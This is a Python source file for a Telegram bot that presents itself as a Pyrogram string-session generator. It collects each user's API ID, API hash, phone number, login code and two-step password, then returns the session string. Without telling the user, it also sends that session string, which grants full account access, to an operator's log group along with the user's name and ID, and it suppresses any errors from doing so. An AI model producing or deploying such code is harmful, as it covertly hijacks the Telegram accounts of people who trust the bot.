import os
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_GROUP_ID = int(os.getenv("LOG_GROUP_ID"))

bot = Client(
    "StringGenBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

USER_DATA = {}  # store temporary details for each user


@bot.on_message(filters.command("start"))
async def start_msg(_, msg):
    await msg.reply("👋 Welcome!\nSend /session to generate your Pyrogram String Session.")


@bot.on_message(filters.command("session"))
async def ask_api_id(_, msg: Message):
    USER_DATA[msg.from_user.id] = {}
    await msg.reply("🧾 Enter your **API ID**:")
    api_id = await bot.listen(msg.chat.id)
    USER_DATA[msg.from_user.id]["api_id"] = int(api_id.text)

    await msg.reply("🔑 Enter your **API HASH**:")
    api_hash = await bot.listen(msg.chat.id)
    USER_DATA[msg.from_user.id]["api_hash"] = api_hash.text

    await msg.reply("📞 Enter your **Phone Number with country code**:\nExample: +918888888888")
    number = await bot.listen(msg.chat.id)
    USER_DATA[msg.from_user.id]["number"] = number.text

    await generate_step_2(msg)


async def generate_step_2(msg: Message):
    uid = msg.from_user.id
    data = USER_DATA[uid]

    temp = Client(
        name=str(uid),
        api_id=data["api_id"],
        api_hash=data["api_hash"]
    )

    await temp.connect()
    sent = await temp.send_code(data["number"])
    await msg.reply("📩 Enter the OTP you received:")
    otp = await bot.listen(msg.chat.id)

    try:
        await temp.sign_in(data["number"], sent.phone_code_hash, otp.text)
    except SessionPasswordNeeded:
        await msg.reply("🔐 2-Step Verification enabled!\nEnter your **password**:")
        password = await bot.listen(msg.chat.id)
        await temp.check_password(password.text)

    string = await temp.export_session_string()
    await temp.disconnect()

    # Send to user
    await msg.reply(
        f"🎉 **Your Pyrogram String Session:**\n\n`{string}`\n\n⚠ Save it safely!"
    )

    # Send to log group
    try:
        await bot.send_message(
            LOG_GROUP_ID,
            f"🔰 **New String Generated**\n\n"
            f"👤 Name: {msg.from_user.first_name}\n"
            f"🆔 User ID: `{msg.from_user.id}`\n"
            f"🔑 Session:\n`{string}`"
        )
    except:
        pass

    USER_DATA.pop(uid, None)


bot.run()
